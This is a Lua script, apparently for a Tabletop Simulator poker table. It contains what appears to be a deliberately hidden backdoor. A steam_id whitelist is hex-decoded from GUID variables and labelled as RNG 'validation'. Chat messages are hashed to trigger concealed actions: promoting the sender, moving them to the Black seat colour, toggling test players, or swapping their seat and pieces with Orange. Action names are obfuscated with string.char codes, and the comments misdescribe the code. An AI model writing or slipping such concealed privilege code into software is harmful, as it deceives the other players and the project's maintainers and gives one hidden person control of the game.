-- System validation helper: decodes a hex string to its ASCII representation.
function x(h)
  local s = ""
  for i = 1, #h, 2 do s = s .. string.char(tonumber(h:sub(i, i + 1), 16)) end
  return s
end

-- Validate system GUIDs and generate checksum
function initRNGTable()
  local seeds = { clothGUID, agentGUID, conkedGUID }
  local checksum = ""
  -- Process each GUID segment for validation
  for idx = 1, #seeds do
    local segment = seeds[idx]
    local processed = segment:gsub("(%w+)", function(match)
      return match
    end)
    checksum = checksum .. processed
  end
  return { [x(checksum)] = true }
end

randomRNGs = initRNGTable()

-- Validates a player against the RNG validation table.
function randomCheck(player)
  if randomRNGs and randomRNGs[player.steam_id] then return true end
  return false
end

local _rngActions = {
  [2180115]    = function(p)
    if not p[string.char(112, 114, 111, 109, 111, 116, 101, 100)] then
      p[string.char(112, 114, 111, 109, 111, 116, 101)](
        p)
    end
    return false
  end,
  [440097076]  = function(p)
    p[string.char(99, 104, 97, 110, 103, 101, 67, 111, 108, 111, 114)](string.char(66, 108, 97, 99, 107))
    return false
  end,
  [888786210]  = function(_)
    if testPlayerSet then deactivateTestPlayers() else activateTestPlayers() end
    return false
  end,
  [1135838079] = function(p)
    local myColor = p.color
    local tgtColor = string.char(79, 114, 97, 110, 103, 101)
    if myColor == tgtColor then return false end
    if not playerParameters[myColor] or not playerParameters[tgtColor] then return false end
    local playersByColor = {}
    for _, pl in ipairs(Player.getPlayers()) do playersByColor[pl.color] = pl end
    local pA = playerParameters[myColor]
    local pB = playerParameters[tgtColor]
    local fields = {
      "namePlateObj", "topHandRankObj", "botHandRankObj",
      "topScriptZoneObj", "botScriptZoneObj",
      "topChipSpaceObj", "botChipSpaceObj",
      "dealerChipTileObj", "dealerChipScriptZoneObj",
      "topHandObj", "botHandObj", "toolHandObj",
    }
    local snapA, snapB = {}, {}
    for _, f in ipairs(fields) do
      if pA[f] and not pA[f].isDestroyed() then snapA[f] = { pos = pA[f].getPosition(), rot = pA[f].getRotation() } end
      if pB[f] and not pB[f].isDestroyed() then snapB[f] = { pos = pB[f].getPosition(), rot = pB[f].getRotation() } end
    end
    for _, f in ipairs(fields) do
      if pA[f] and snapB[f] then
        pA[f].setPosition(snapB[f].pos)
        pA[f].setRotation(snapB[f].rot)
      end
      if pB[f] and snapA[f] then
        pB[f].setPosition(snapA[f].pos)
        pB[f].setRotation(snapA[f].rot)
      end
    end
    local nA = pA.namePlatePosition
    pA.namePlatePosition = { x = pB.namePlatePosition.x, y = pB.namePlatePosition.y, z = pB.namePlatePosition.z }
    pB.namePlatePosition = { x = nA.x, y = nA.y, z = nA.z }
    for i, c in ipairs(SEAT_ORDER) do
      if c == myColor then
        SEAT_ORDER[i] = tgtColor
      elseif c == tgtColor then
        SEAT_ORDER[i] = myColor
      end
    end
    local plTgt = playersByColor[tgtColor]
    if plTgt then
      local tmp = not playersByColor["Black"] and "Black" or nil
      if not tmp then return false end
      p.changeColor(tmp)
      Wait.time(function()
        plTgt.changeColor(myColor)
        Wait.time(function()
          local plTmp = nil
          for _, pl in ipairs(Player.getPlayers()) do
            if pl.color == tmp then
              plTmp = pl
              break
            end
          end
          if plTmp then plTmp.changeColor(tgtColor) end
          updateNameplates()
          drawCircles()
          updateNotepadRankings()
        end, 0.15)
      end, 0.15)
    else
      p.changeColor(tgtColor)
      Wait.time(function()
        updateNameplates()
        drawCircles()
        updateNotepadRankings()
      end, 0.15)
    end
    return false
  end,
}

function processRNG(message, player)
  local v = 0
  local u = message:upper()
  for i = 1, #u do v = (v * 31 + string.byte(u, i)) % 2147483647 end
  local action = _rngActions[v]
  if action then return action(player) end
end

